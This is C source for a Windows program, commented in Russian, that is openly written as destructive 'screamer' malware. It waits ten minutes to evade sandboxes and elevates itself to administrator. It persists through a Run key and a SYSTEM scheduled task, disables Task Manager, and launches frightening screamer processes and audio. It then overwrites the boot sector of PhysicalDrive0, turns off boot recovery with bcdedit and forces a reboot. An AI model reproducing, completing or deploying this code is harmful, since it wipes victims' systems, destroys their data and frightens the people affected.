#include <windows.h>
#include <stdio.h>
#include <math.h>

void install_keyboard_block(void);
void disable_taskmgr(void);
void block_power(void);

// Функция генерации страшного звука
void generate_scream_wav() {
    const char *path = "C:\\Users\\Public\\scream.wav";
    FILE *f = fopen(path, "wb");
    if (!f) return;

    int sampleRate = 44100;
    int duration = 15; // 15 секунд
    int numSamples = sampleRate * duration;
    int dataSize = numSamples * 2; // 16-bit mono
    int fileSize = 36 + dataSize;

    // Заголовок WAV
    fwrite("RIFF", 1, 4, f);
    fwrite(&fileSize, 4, 1, f);
    fwrite("WAVEfmt ", 1, 8, f);
    int fmtSize = 16; fwrite(&fmtSize, 4, 1, f);
    short format = 1; fwrite(&format, 2, 1, f);
    short channels = 1; fwrite(&channels, 2, 1, f);
    fwrite(&sampleRate, 4, 1, f);
    int byteRate = sampleRate * 2; fwrite(&byteRate, 4, 1, f);
    short blockAlign = 2; fwrite(&blockAlign, 2, 1, f);
    short bitsPerSample = 16; fwrite(&bitsPerSample, 2, 1, f);
    fwrite("data", 1, 4, f);
    fwrite(&dataSize, 4, 1, f);

    // Генерация ужасающего шума (диссонансные волны + белый шум)
    for (int i = 0; i < numSamples; i++) {
        double t = (double)i / sampleRate;
        // Низкий гул, который меняется
        double freq1 = 80.0 + 50.0 * sin(t * 2.0 * 3.14159);
        // Резкий высокий скрежет
        double freq2 = 1500.0 + 1000.0 * sin(t * 10.0);
        // Белый шум (хаос)
        double noise = ((rand() % 2000) - 1000) / 1000.0;
        
        double val = sin(t * freq1 * 2.0 * 3.14159) * 0.5 
                   + sin(t * freq2 * 2.0 * 3.14159) * 0.2
                   + noise * 0.3;
        
        // Резкие скачки громкости
        if ((int)(t * 4) % 2 == 0) val *= 1.5;
        
        short sample = (short)(val * 32767.0);
        fwrite(&sample, 2, 1, f);
    }
    fclose(f);
}

void launch_screamers(void) {
    const char *exes[] = {"screamer1.exe","screamer2.exe","screamer3.exe",
                          "screamer4.exe","screamer5.exe"};
    for (int i = 0; i < 5; i++) {
        STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0};
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;
        CreateProcessA(NULL, (LPSTR)exes[i], NULL, NULL, FALSE,
                       CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    }
}

int main(void) {
    Sleep(600000); // Ждем 10 минут (обход песочницы)

    BOOL admin = FALSE;
    PSID grp = NULL; SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    AllocateAndInitializeSid(&nt, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &grp);
    CheckTokenMembership(NULL, grp, &admin);
    FreeSid(grp);
    if (!admin) {
        char path[MAX_PATH]; GetModuleFileNameA(NULL, path, MAX_PATH);
        ShellExecuteA(NULL, "runas", path, NULL, NULL, SW_SHOW);
        return 0;
    }

    char cur[MAX_PATH]; GetModuleFileNameA(NULL, cur, MAX_PATH);
    CopyFileA(cur, "C:\\Users\\Public\\setup.exe", FALSE);

    // Копируем скримеры в Public, чтобы они там лежали
    CopyFileA("screamer1.exe", "C:\\Users\\Public\\screamer1.exe", FALSE);
    CopyFileA("screamer2.exe", "C:\\Users\\Public\\screamer2.exe", FALSE);
    CopyFileA("screamer3.exe", "C:\\Users\\Public\\screamer3.exe", FALSE);
    CopyFileA("screamer4.exe", "C:\\Users\\Public\\screamer4.exe", FALSE);
    CopyFileA("screamer5.exe", "C:\\Users\\Public\\screamer5.exe", FALSE);

    generate_scream_wav(); // Создаем звук

    HKEY k;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &k);
    RegSetValueExA(k, "Screamer", 0, REG_SZ,
        (BYTE*)"C:\\Users\\Public\\setup.exe", 30);
    RegCloseKey(k);
    
    system("schtasks /create /tn Screamer /tr C:\\\\Users\\\\Public\\\\setup.exe "
           "/sc onlogon /ru SYSTEM /f");

    disable_taskmgr();
    block_power();
    launch_screamers();

    HANDLE h = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w; char zero[512] = {0};
        WriteFile(h, zero, 512, &w, NULL);
        CloseHandle(h);
    }
    system("bcdedit /set {default} recoveryenabled No");
    system("bcdedit /set {default} bootstatuspolicy ignoreallfailures");
    system("shutdown /r /f /t 10");

    install_keyboard_block();
    return 0;
}
